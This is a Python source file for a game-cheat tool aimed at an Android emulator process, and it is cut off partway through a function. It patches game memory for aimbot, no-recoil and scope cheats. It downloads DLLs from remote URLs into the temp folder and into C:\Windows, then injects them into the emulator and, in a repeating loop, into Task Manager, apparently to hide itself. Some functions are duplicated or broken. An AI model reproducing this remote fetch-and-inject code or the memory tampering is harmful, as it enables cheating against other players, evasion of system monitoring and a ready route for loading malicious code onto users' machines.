from flask import *
import threading
from datetime import datetime

import random

import winreg
import json

import pymem
import pymem.process
import re
import threading
import psutil
import requests
import win32api
import win32con
import win32process
import win32event
import sys
import glob
import subprocess
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
from pynput import mouse
from pynput.mouse import Button, Listener as MouseListener, Controller
import struct
from ctypes import wintypes
import tempfile
import winsound 
import struct
from pymem import *
from pymem.memory import read_bytes, write_bytes
from pymem.pattern import pattern_scan_all
from pynput.mouse import Button, Listener as MouseListener
























DLL_NAME = "TaskManagerHack.dll"
DLL_URL = "https://github.com/anshxd1/taskmanagerdll/blob/4ef2bcf79ecde5f5d3433f25e47383ce72b4f3f6/TaskManagerHack.dll"  # ← APNA LINK DAALO
TEMP_DIR = tempfile.gettempdir()
DLL_PATH = os.path.join(TEMP_DIR, DLL_NAME)





original_values = {}

def find_emulator_pid(process_name):
    for process in psutil.process_iter(['pid', 'name']):
        if process_name in process.info['name']:
            return process.info['pid']
    return None

def scan_and_store_pattern(pm, feature_name, search_pattern):
    """Scans and stores the pattern for a given feature, including original bytes at each address."""
    matches = pm.pattern_scan_all(search_pattern, return_multiple=True)
    if matches:
        original_values[feature_name] = [
            (match, pm.read_bytes(match, len(search_pattern))) for match in matches
        ]
        return True
    return False

def replace_pattern(process_name, search, replace):
    try:
        pid = find_emulator_pid(process_name)
        if not pid:
            return "Process not found"

        pm = pymem.Pymem(pid)
        matches = pm.pattern_scan_all(search, return_multiple=True)
        if matches:
            for match in matches:
                pm.write_bytes(match, replace, len(replace))
            return "Success"
        return "Pattern not found"
    except Exception as e:
        return "An error occurred"

def scan_pattern(process_name, search):
    try:
        pid = find_emulator_pid(process_name)
        if not pid:
            return "Process not found"

        pm = pymem.Pymem(pid)
        matches = pm.pattern_scan_all(search, return_multiple=True)
        if matches:
            return "Success"
        return "Pattern not found"
    except Exception as e:
        return "An error occurred"

def replace_pattern(pm, feature_name, replace_pattern):
    """Replaces the stored pattern for a given feature."""
    if feature_name in original_values:
        for address, original_bytes in original_values[feature_name]:
            pm.write_bytes(address, replace_pattern, len(replace_pattern))
        return "Success"
    return "Pattern not found in memory"

def mkp(aob: str):
    if '??' in aob:
        if aob.startswith("??"):
            aob = f" {aob}"
            n = aob.replace(" ??", ".").replace(" ", "\\x")
            b = bytes(n.encode())
        else:
            n = aob.replace(" ??", ".").replace(" ", "\\x")
            b = bytes(f"\\x{n}".encode())
        del n
        return b
    else:
        m = aob.replace(" ", "\\x")
        c = bytes(f"\\x{m}".encode())
        del m
        return c



def download_dll(url, path):
    try:
        print(f"[DLL] Downloading from {url}...")
        response = requests.get(url, stream=True, timeout=15)
        if response.status_code != 200:
            print(f"[!] HTTP {response.status_code}")
            return False
        with open(path, 'wb') as f:
            for chunk in response.iter_content(1024*1024):
                f.write(chunk)
        print(f"[DLL] SUCCESS: Saved to {path}")
        return True
    except Exception as e:
        print(f"[DLL] FAILED: {e}")
        return False

def inject_dll(pid, dll_path):
    try:
        PROCESS_ALL_ACCESS = 0x1F0FFF
        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            return False

        page_size = len(dll_path.encode('utf-8')) + 1
        arg_address = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, page_size, 0x3000, 0x40)
        if not arg_address:
            ctypes.windll.kernel32.CloseHandle(h_process)
            return False

        written = ctypes.c_int(0)
        ctypes.windll.kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), page_size, ctypes.byref(written))

        kernel32 = ctypes.windll.kernel32
        load_lib = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_lib, arg_address, 0, None)

        ctypes.windll.kernel32.WaitForSingleObject(h_thread, 5000)
        ctypes.windll.kernel32.CloseHandle(h_thread)
        ctypes.windll.kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000)
        ctypes.windll.kernel32.CloseHandle(h_process)

        print(f"[DLL] Injected {DLL_NAME} into PID {pid}")
        return True
    except Exception as e:
        print(f"[DLL] Injection failed: {e}")
        return False

# ==================== TASK MANAGER BYPASS ====================
def taskmanager():
    pid = None
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == "taskmgr.exe":
            pid = proc.info['pid']
            break
    if not pid:
        return "Task Manager not running"

    # DLL PATH
    global DLL_PATH
    if not os.path.isfile(DLL_PATH):
        print(f"[DLL] File not found: {DLL_PATH}")
        if not download_dll(DLL_URL, DLL_PATH):
            return "Failed to download DLL"
        else:
            print(f"[DLL] Downloaded: {DLL_PATH}")

    # INJECT
    if inject_dll(pid, DLL_PATH):
        return "Task Manager Bypassed successfully"
    return "Injection failed"

# ==================== AUTO BYPASS LOOP ====================
auto_bypass_enabled = False
auto_bypass_thread = None
injected_pids = set()

def auto_inject_loop():
    global auto_bypass_enabled, injected_pids
    while auto_bypass_enabled:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == "taskmgr.exe":
                    pid = proc.info['pid']
                    if pid not in injected_pids:
                        print(f"[AUTO] Injecting into TaskMgr PID: {pid}")
                        result = taskmanager_inject_single(pid)
                        if "success" in result.lower():
                            injected_pids.add(pid)
            injected_pids = {p for p in injected_pids if psutil.pid_exists(p)}
        except:
            pass
        time.sleep(2)

def taskmanager_inject_single(pid):
    if not os.path.isfile(DLL_PATH):
        if not download_dll(DLL_URL, DLL_PATH):
            return "DLL download failed"
    return "success" if inject_dll(pid, DLL_PATH) else "Injection failed"

def enable_auto_bypass():
    global auto_bypass_enabled, auto_bypass_thread
    if auto_bypass_enabled:
        return "Already enabled"
    auto_bypass_enabled = True
    auto_bypass_thread = threading.Thread(target=auto_inject_loop, daemon=True)
    auto_bypass_thread.start()
    return "AUTO BYPASS ENABLED"

def disable_auto_bypass():
    global auto_bypass_enabled
    auto_bypass_enabled = False
    return "AUTO BYPASS DISABLED"












class Aimbot:
    base_addresses = []
    mem = None
    is_initialized = False
    running = False
    thread = None

    @classmethod
    def init_aimbot(cls):
        pattern = mkp("FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 A5 43")
        pid = find_emulator_pid("HD-Player.exe")
        if not pid:
            print("Emulator Not Found")
            return "Open Game"
        cls.mem = pymem.Pymem(pid)
        cls.base_addresses = pattern_scan_all(cls.mem.process_handle, pattern, return_multiple=True)
        cls.is_initialized = len(cls.base_addresses) > 0
        if cls.is_initialized:
            print(f"{len(cls.base_addresses)} Address Found")
            original_values["Aimbot"] = [(addr, cls.mem.read_bytes(addr + 0XF0, 4)) for addr in cls.base_addresses]
            return "Aimbot loaded"
        print("Address Not Found")
        return "Pattern Not Found"

    @classmethod
    def work(cls):
        while cls.running and cls.is_initialized:
            for base_addr in cls.base_addresses:
                try:
                    head_value = cls.mem.read_int(base_addr + 0XF0)
                    if head_value == 0:
                        continue
                    for _ in range(10):
                        cls.mem.write_int(base_addr - 0X304, head_value)
                    cls.mem.write_int(base_addr - 0X304, head_value)
                except:
                    pass
            time.sleep(0)  

    @classmethod
    def start(cls):
        if not cls.is_initialized:
            result = cls.init_aimbot()
            if not cls.is_initialized:
                return result
        if not cls.running:
            cls.running = True
            cls.thread = threading.Thread(target=cls.work, daemon=True)
            cls.thread.start()
            print("Aimbot ON")
            return "Aimbot Started"
        return "Aimbot Already Running"

    @classmethod
    def stop(cls):
        if cls.running:
            cls.running = False
            cls.thread = None
            if cls.mem:
                cls.mem.close_process()
                cls.mem = None
            cls.is_initialized = False
            cls.base_addresses = []
            print("Aimbot OFF")
            return "Aimbot Disabled"
        return "Aimbot Not Running"


def aimbot_on():
    return Aimbot.start()

def aimbot_off():
    return Aimbot.stop()






original_value = []  
aimbot_addresses = []
aimbot_lock = threading.Lock()

# --- DRAG PRO REFINED IMPLEMENTATION ---
drag_pro_mode = "default"
is_lmb_pressed = False
drag_start_y = 0
drag_pro_originals = {}  # {addr: original_bytes}
multiplier_map = {
    'low': 200,    # Threshold pixels
    'mid': 100,
    'high': 50
}

def on_click(x, y, button, pressed):
    global is_lmb_pressed, drag_start_y
    if button == Button.left:
        is_lmb_pressed = pressed
        if pressed:
            drag_start_y = y

def apply_drag_pro_logic():
    pm = None
    drag_active = False # Tracks if we are currently "shifted" to 0xAA values
    
    while True:
        try:
            if drag_pro_mode != "default":
                if pm is None:
                    try:
                        pid = find_emulator_pid("HD-Player.exe")
                        if pid: pm = pymem.Pymem(pid)
                        else:
                            time.sleep(1)
                            continue
                    except:
                        time.sleep(1)
                        continue

                # Lock and get targets
                with aimbot_lock:
                    targets = aimbot_addresses[:100] if aimbot_addresses else []

                if is_lmb_pressed and targets:
                    curr_pos = Controller().position
                    curr_y = curr_pos[1]
                    # dist_up > 0 means mouse is ABOVE start position
                    dist_up = drag_start_y - curr_y
                    threshold = multiplier_map.get(drag_pro_mode, 999)

                    if dist_up >= threshold:
                        # ACTIVATE
                        if not drag_active:
                            for addr in targets:
                                try:
                                    orig = read_bytes(pm.process_handle, addr + 0xA6, 4)
                                    drag_pro_originals[addr] = orig
                                except: pass
                            drag_active = True
                        
                        for addr in targets:
                            try:
                                # Apply HEADON style logic: Copy 0xAA to 0xA6
                                val_aa = read_bytes(pm.process_handle, addr + 0xAA, 4)
                                write_bytes(pm.process_handle, addr + 0xA6, val_aa, 4)
                            except: pass
                    else:
                        # RESTORE
                        if drag_active:
                            for addr, orig in drag_pro_originals.items():
                                try: write_bytes(pm.process_handle, addr + 0xA6, orig, 4)
                                except: pass
                            drag_active = False
                else:
                    # RESTORE ON RELEASE
                    if drag_active:
                        for addr, orig in drag_pro_originals.items():
                            try: write_bytes(pm.process_handle, addr + 0xA6, orig, 4)
                            except: pass
                        drag_active = False
                    
                time.sleep(0.01)
            else:
                # Mode is DEFAULT: ensure everything is restored if it was active
                if drag_active and pm:
                    for addr, orig in drag_pro_originals.items():
                        try: pm.write_bytes(addr + 0xA6, orig, 4)
                        except: pass
                    drag_active = False
                
                if pm:
                    pm.close_process()
                    pm = None
                time.sleep(0.1)
        except:
            if pm: 
                try: pm.close_process()
                except: pass
                pm = None
            time.sleep(0.1)

# Start Listener and Permanent Thread
MouseListener(on_click=on_click).start()
threading.Thread(target=apply_drag_pro_logic, daemon=True).start()

def DRAGPRO_ON(mode):
    global drag_pro_mode
    drag_pro_mode = mode
    return f"Drag Pro {mode.upper()} Active"

def DRAGPRO_OFF():
    global drag_pro_mode
    drag_pro_mode = "default"
    return "Drag Pro Disabled"

def HEADLOAD():
    try:

        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        return

    try:
        if proc:
            print("\033[31m[>]\033[0m Searching Entity...")
            
            global aimbot_addresses
            entity_pattern = mkp("FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 A5 43")
            found_addresses = pattern_scan_all(proc.process_handle, entity_pattern, return_multiple=True)
            
            with aimbot_lock:
                aimbot_addresses = found_addresses if found_addresses else []

            if aimbot_addresses:
                print("Addresses found")
                
            else:
                print("Failed")
    
    except:
        print("")
    finally:
        if proc:
            proc.close_process()
    return "Fitur Berhasil Di Load"
    


def HEADON():
    try:
        proc = Pymem("HD-Player")
    
        if proc:
            global original_value
            original_value = []
            for current_entity in aimbot_addresses:
                original_value.append((current_entity, read_bytes(proc.process_handle, current_entity + 0xA6, 4)))
                # Read the value at current_entity + 0x60
                # Read the value at current_entity + 0x2C
                value_bytes = read_bytes(proc.process_handle, current_entity +  0xAA, 4) 
                
                # Write the value to current_entity + 0x5C
                # Write the value to current_entity + 0x28
                write_bytes(proc.process_handle, current_entity + 0xA6, value_bytes, len(value_bytes))
    except pymem.exception.ProcessNotFound:
        print("")
        return
    finally:
        if proc:
            proc.close_process()
           
    return "AIMBOT HEAD ON"

def HEADOFF():
    try:
        # Open the process
        proc = Pymem("HD-Player")
        
        if original_value:
         
            for i in original_value:
                # Write the value to current_entity + 0x5C
                # Write the value to current_entity + 0x28
                write_bytes(proc.process_handle, i[0] + 0xA6, i[1], len(i[1]))
    except pymem.exception.ProcessNotFound:
        print("")
        return
    finally:
        if proc:
            proc.close_process()
    return "AIMBOT HEAD OFF"



def RIGHTSHOULDERON():
    try:
        # Open the process
        proc = Pymem("HD-Player")
    
        if proc:
            global original_value
            # Save the original value to variable, btw all the orginal values are same so we just save one
            original_value = []
            for current_entity in aimbot_addresses:
                original_value.append((current_entity, read_bytes(proc.process_handle, current_entity + 0X7C, 4)))
                # Read the value at current_entity + 0x60
                # Read the value at current_entity + 0x2C
                value_bytes = read_bytes(proc.process_handle, current_entity + 0xC0, 4)
                
                # Write the value to current_entity + 0x5C
                # Write the value to current_entity + 0x28
                write_bytes(proc.process_handle, current_entity + 0X7C, value_bytes, len(value_bytes))    
    except pymem.exception.ProcessNotFound:
        print("")
        return
    finally:
        if proc:
            proc.close_process()
           
    return "AIMBOT DRAG ON"

def RIGHTSHOULDEROFF():
    try:
        # Open the process
        proc = Pymem("HD-Player")
        
        if original_value: # check the original value is present or not
         
            for i in original_value:
                # Write the value to current_entity + 0x5C
                # Write the value to current_entity + 0x28
                write_bytes(proc.process_handle, i[0] + 0X7C, i[1], len(i[1]))
    except pymem.exception.ProcessNotFound:
        print("")
        return
    finally:
        if proc:
            proc.close_process()
    return "AIMBOT DRAG OFF"


def LEFTSHOULDERON():
    try:
        # Open the process
        proc = Pymem("HD-Player")
    
        if proc:
            global original_value
            # Save the original value to variable, btw all the orginal values are same so we just save one
            original_value = []
            for current_entity in aimbot_addresses:
                original_value.append((current_entity, read_bytes(proc.process_handle, current_entity + 0X7C, 4)))
                # Read the value at current_entity + 0x60
                # Read the value at current_entity + 0x2C
                value_bytes = read_bytes(proc.process_handle, current_entity + 0xBC, 4) 
                
                # Write the value to current_entity + 0x5C
                # Write the value to current_entity + 0x28
                write_bytes(proc.process_handle, current_entity + 0X7C, value_bytes, len(value_bytes))    
    except pymem.exception.ProcessNotFound:
        print("")
        return
    finally:
        if proc:
            proc.close_process()
           
    return "AIMBOT DRAG ON"

def LEFTSHOULDEROFF():
    try:
        # Open the process
        proc = Pymem("HD-Player")
        
        if original_value: # check the original value is present or not
         
            for i in original_value:
                # Write the value to current_entity + 0x5C
                # Write the value to current_entity + 0x28
                write_bytes(proc.process_handle, i[0] + 0X7C, i[1], len(i[1]))
    except pymem.exception.ProcessNotFound:
        print("")
        return
    finally:
        if proc:
            proc.close_process()
    return "AIMBOT DRAG OFF"




# def taskmanager():
#     process_name = "Taskmgr.exe"

#     try:
#         # Open the process
#         temp_dll_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'task.dll')

#         dll_path_bytes = bytes(temp_dll_path.encode('UTF-8'))

#         open_process = Pymem(process_name)

#         process.inject_dll(open_process.process_handle, dll_path_bytes)
#         print("Task Manager Injected DLL Successfully!") 

#     except pymem.exception.ProcessNotFound:
#         print("Task Manager not found!")
#     except Exception as e:
#         print(f"Error: {e}")


aimbot_addresseso = []
def neckload():
    try:

        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        return

    try:
        if proc:
            print("\033[31m[>]\033[0m Searching Entity...")
            
            global aimbot_addresseso
            entity_pattern = mkp("FF FF FF FF 00 00 00 00 00 00 00 00 FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 01 01 01 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 FF FF FF FF 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? 00 00 00 ?? 00 00 00 00 00 00 00 ?? 00 00 ?? ?? 00 00 00 ?? ?? 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? 00 00 ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? 00 00 ?? ?? 00 00 00 ?? ?? 00 00 00 00 00 00 00 ?? 00 00 00 00 00 00 00 00 00 00")
            aimbot_addresseso = pattern_scan_all(proc.process_handle, entity_pattern, return_multiple=True)

            if aimbot_addresseso:
                print("Addresses found")
                
            else:
                print("Failed")
    
    except:
        print("")
    finally:
        if proc:
            proc.close_process()
    return "Fitur Berhasil Di Load"
    


def neckon():
    try:
        proc = Pymem("HD-Player")
    
        if proc:
            global original_value
            original_value = []
            for current_entity in aimbot_addresseso:
                original_value.append((current_entity, read_bytes(proc.process_handle, current_entity + 0x2C8, 4)))
                # Read the value at current_entity + 0x60
                # Read the value at current_entity + 0x2C
                value_bytes = read_bytes(proc.process_handle, current_entity +  0x2CC, 4) 
                
                # Write the value to current_entity + 0x5C
                # Write the value to current_entity + 0x28
                write_bytes(proc.process_handle, current_entity + 0x2C8, value_bytes, len(value_bytes))
    except pymem.exception.ProcessNotFound:
        print("")
        return
    finally:
        if proc:
            proc.close_process()
           
    return "AIMBOT HEAD ON"

def neckoff():
    try:
        # Open the process
        proc = Pymem("HD-Player")
        
        if original_value:
         
            for i in original_value:
                # Write the value to current_entity + 0x5C
                # Write the value to current_entity + 0x28
                write_bytes(proc.process_handle, i[0] + 0x2C8, i[1], len(i[1]))
    except pymem.exception.ProcessNotFound:
        print("")
        return
    finally:
        if proc:
            proc.close_process()
    return "AIMBOT HEAD OFF"




def noRecoil_on():
    process_name = "HD-Player.exe"
    pid = find_emulator_pid(process_name)
    if not pid:
        return "Process not found"
    pm = pymem.Pymem(pid)
    replace = b"\x01\xEE\x00\x0A\x81\xEE\x10\x0A\x10\xEE\x10\x8C\xBD\xE8\x00\x00\x7A\xFF\xF0\x48\x2D\xE9\x10\xB0\x8D\xE2\x02\x8B\x2D\xED\x08\xD0\x4D\xE2\x00\x50\xA0\xE1"
    replace_pattern(pm, "NoRecoil", replace)
    print("NoRecoil Activated")
    return "NoRecoil Activated"

def noRecoil_off():
    process_name = "HD-Player.exe"
    pid = find_emulator_pid(process_name)
    if not pid:
        return "Process not found"

    pm = pymem.Pymem(pid)
    if "NoRecoil" in original_values:
        for address, original_bytes in original_values["NoRecoil"]:
            pm.write_bytes(address, original_bytes, len(original_bytes))
        return "NoRecoil Deactivated"
    return "Original pattern not stored"

def glitch_fire_on():
    process_name = "HD-Player.exe"
    pid = find_emulator_pid(process_name)
    if not pid:
        return "Process not found"
    pm = pymem.Pymem(pid)
    replace = b"\x00\x00"
    replace_pattern(pm, "GlitchFire", replace)
    print("GlitchFire Activated")
    return "GlitchFire Activated"

def glitch_fire_off():
    process_name = "HD-Player.exe"
    pid = find_emulator_pid(process_name)
    if not pid:
        return "Process not found"
    pm = pymem.Pymem(pid)
    if "GlitchFire" in original_values:
        for address, original_bytes in original_values["GlitchFire"]:
            pm.write_bytes(address, original_bytes, len(original_bytes))
        return "GlitchFire Deactivated"
    return "Original pattern not stored"


def sniper_delay_on():
    process_name = "HD-Player.exe"
    pid = find_emulator_pid(process_name)
    if not pid:
        return "Process not found"
    pm = pymem.Pymem(pid)
    replace = b"\x01\x00\xAF\xE3\xEA\x00\x60\xA0\xE3\x06\x00\xA0\xE1\x18\xD0\x4B\xE2\x02\x8B\xBD\xEC\x70\x8C\xBD\xE8"
    replace_pattern(pm, "sniperd", replace)
    print("SniperDelay Activated")
    return "SniperDelay Activated"

def sniper_delay_off():
    process_name = "HD-Player.exe"
    pid = find_emulator_pid(process_name)
    if not pid:
        return "Process not found"
    pm = pymem.Pymem(pid)
    if "sniperd" in original_values:
        for address, original_bytes in original_values["sniperd"]:
            pm.write_bytes(address, original_bytes, len(original_bytes))
        return "SniperDelay Deactivated"
    return "Original pattern not stored"



def box3d():
    process_name = "HD-Player"

    try:
        # Open the process
        temp_dll_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'CHAMS MENU.dll')

        dll_path_bytes = bytes(temp_dll_path.encode('UTF-8'))

        open_process = Pymem(process_name)

        process_name.inject_dll(open_process.process_handle, dll_path_bytes)
        print("Chams Box Injected DLL Successfully!") 

    except pymem.exception.ProcessNotFound:
        print("Task Manager not found!")
    except Exception as e:
        print(f"Error: {e}")



def inject_dll(process_id, dll_path):
    try:
        process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, process_id)
        alloc_mem = win32process.VirtualAllocEx(process_handle, 0, len(dll_path), win32con.MEM_COMMIT, win32con.PAGE_READWRITE)
        win32process.WriteProcessMemory(process_handle, alloc_mem, dll_path.encode('utf-8'))
        h_kernel32 = win32api.GetModuleHandle('kernel32')
        load_library_addr = win32api.GetProcAddress(h_kernel32, 'LoadLibraryA')
        h_thread = win32process.CreateRemoteThread(process_handle, None, 0, load_library_addr, alloc_mem, 0)
        win32event.WaitForSingleObject(h_thread, win32event.INFINITE)
        win32process.VirtualFreeEx(process_handle, alloc_mem, 0, win32con.MEM_RELEASE)
        win32api.CloseHandle(process_handle)

        return True
    except Exception as e:
        return False


def download_dll(url, save_path):
    try:
        response = requests.get(url, stream=True, timeout=15)
        if response.status_code == 200:
            with open(save_path, "wb") as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)
            return True
        else:
            print(f"[!] HTTP Error: {response.status_code}")
            return False
    except Exception as e:
        print(f"[!] Download Failed: {e}")
        return False



def chamsmenu():
    process_id = None
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == "HD-Player.exe":
            process_id = proc.info['pid']
            break
    if not process_id:
        return 'Process not found'
    dll_path = r"C:\Windows\9h7fqp.dll"
    dll_url = "https://github.com/paneluserop/dlll-babu/releases/download/v1.0.0/9h7fqp.dll"
    if not os.path.isfile(dll_path):
        if not download_dll(dll_url, dll_path):
            return 'Failed to download DLL'
    result = inject_dll(process_id, dll_path)
    if result:
        return 'success'
    return 'Esp Menu injected successfully'


def chamsmenu64():
    process_id = None
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == "HD-Player.exe":
            process_id = proc.info['pid']
            break
    if not process_id:
        return 'Process not found'
    dll_path = r"C:\Windows\9h7fqp.dll"
    dll_url = "https://github.com/paneluserop/dlll-babu/releases/download/v1.0.0/9h7fqp.dll"
    if not os.path.isfile(dll_path):
        if not download_dll(dll_url, dll_path):
            return 'Failed to download DLL'
    result = inject_dll(process_id, dll_path)
    if result:
        return 'success'
    return 'Esp Menu injected successfully'




def chams3d():
    process_name = "HD-Player.exe"

    try:
        # Open the process
        temp_dll_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'CHAMS MENU.dll')

        dll_path_bytes = bytes(temp_dll_path.encode('UTF-8'))

        open_process = Pymem(process_name)

        process_name.inject_dll(open_process.process_handle, dll_path_bytes)
        print("Chams 3D Injected DLL Successfully!") 

    except pymem.exception.ProcessNotFound:
        print("Task Manager not found!")
    except Exception as e:
        print(f"Error: {e}")


PN = "HD-Player.exe"

OA = "FF FF FF FF 08 00 00 00 00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 33 33 13 40"
RA = "FF FF FF FF 08 00 00 00 00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 06 00 00 00 00 00 00 3E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 33 33 13 40"

def a2b(a):
    p = ""
    for b in a.split():
        p += "." if b == "??" else f"\\x{int(b,16):02x}"
    return p.encode()

OB = a2b(OA)
_r = bytes.fromhex(RA.replace(" ", ""))
_o = bytes.fromhex(OA.replace(" ", ""))

sniperScopeAddress = []
original_Scope_value = []
pm = None
listener_active = False
fa = None  
mouse_listener = None  

def SNIPERSCOPELOAD():
    global sniperScopeAddress, pm
    try:
        pm = pymem.Pymem(PN)
        print(f"[>] Attached to {PN}. Searching Entity...")
        sniperScopeAddress = pymem.pattern.pattern_scan_all(pm.process_handle, OB, return_multiple=True)
        if sniperScopeAddress:
            print(f"[+] Found {len(sniperScopeAddress)} sniper scope addresses.")
            start_sniper_mouse_listener()
        else:
            print("[-] Sniper scope pattern not found.")
    except pymem.exception.ProcessNotFound:
        print(f"[-] Process '{PN}' not found.")
    except Exception as e:
        print(f"Error during scope load: {e}")

def ACTIVATELOADEDSCOPE():
    global pm, original_Scope_value, listener_active
    if not sniperScopeAddress:
        print("[-] Scope not loaded.")
        return
    original_Scope_value = []
    try:
        for addr in sniperScopeAddress:
            current_value = pm.read_bytes(addr, len(_o))
            original_Scope_value.append(current_value)
            pm.write_bytes(addr, _r, len(_r))
        print("[+] Sniper Scope enabled")
        listener_active = True
    except Exception as e:
        print(f"Error enabling scope: {e}")

def REMOVELOADEDSCOPE():
    global pm, original_Scope_value, listener_active
    if not sniperScopeAddress or not original_Scope_value:
        print("[-] Nothing to restore.")
        return
    try:
        for i, addr in enumerate(sniperScopeAddress):
            pm.write_bytes(addr, original_Scope_value[i], len(original_Scope_value[i]))
        print("[+] Sniper Scope disabled")
        listener_active = False
        stop_sniper_mouse_listener()
    except Exception as e:
        print(f"Error disabling scope: {e}")

def oc(x, y, b, pressed):
    global pm, listener_active
    if pressed and b == mouse.Button.left and listener_active and sniperScopeAddress:
        try:
            for addr in sniperScopeAddress:
                pm.write_bytes(addr, _r, len(_r))
            time.sleep(0.07)
            for i, addr in enumerate(sniperScopeAddress):
                pm.write_bytes(addr, original_Scope_value[i], len(original_Scope_value[i]))
        except Exception as e:
            print(f"Mouse Listener Error: {e}")

def start_sniper_mouse_listener():
    global mouse_listener
    try:
        if mouse_listener is not None:
            return mouse_listener
        ml = mouse.Listener(on_click=oc)
        ml.daemon = True
        ml.start()
        mouse_listener = ml
        print("[+] Sniper mouse macro active (left-click)")
        return mouse_listener
    except Exception as e:
        print(f"Error starting sniper mouse listener: {e}")
        return None

def stop_sniper_mouse_listener():
    global mouse_listener
    try:
        if mouse_listener is not None:
            mouse_listener.stop()
            mouse_listener = None
            print("[+] Sniper mouse macro stopped")
    except Exception as e:
        print(f"Error stopping sniper mouse listener: {e}")

def SNIPERSWITCHLOAD():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        print("HD-Player not running")
        return "HD-Player not running"

    try:
        if proc:
            print("\033[31m[>]\033[0m Searching Sniper Switch Entities...")
            global sniper_switch_patterns
            sniper_switch_patterns = [
                {
                    'name': 'Sniper Switch',
                    'pattern': "3F 00 00 80 3E 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F",
                    'replacement': "01 00 00 80 00 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01",
                    'addresses': [],
                    'original_values': []
                }
            ]
            
            for pattern_data in sniper_switch_patterns:
                pattern_bytes = mkp(pattern_data['pattern'])
                addresses = pattern_scan_all(proc.process_handle, pattern_bytes, return_multiple=True)
                if addresses:
                    pattern_data['addresses'] = addresses
                    print(f"Found {len(addresses)} addresses for {pattern_data['name']}")
                else:
                    print(f"No addresses found for {pattern_data['name']}")
            
            return "Sniper switch patterns loaded successfully"
    
    except Exception as e:
        print(f"Error in SNIPERSWITCHLOAD: {e}")
        return f"Error: {e}"
    finally:
        if proc:
            proc.close_process()

def ACTIVATELOADEDSWITCH():
    try:
        proc = Pymem("HD-Player")
        start_time = time.time()
        print("Activating sniper switches... Starting process at", time.ctime(start_time))
        
        if proc:
            for pattern_data in sniper_switch_patterns:
                if not pattern_data['addresses']:
                    print(f"Skipping {pattern_data['name']}: No addresses found")
                    continue
                pattern_data['original_values'] = []
                replacement_bytes = bytes.fromhex(pattern_data['replacement'].replace(" ", ""))
                pattern_bytes = bytes.fromhex(pattern_data['pattern'].replace(" ", ""))
                
                print(f"Processing {pattern_data['name']} with {len(pattern_data['addresses'])} addresses")
                for addr in pattern_data['addresses']:
                    print(f"Finding original value at address {hex(addr)}")
                    original_value = read_bytes(proc.process_handle, addr, len(pattern_bytes))
                    print(f"Original value at {hex(addr)}: {original_value.hex()}")
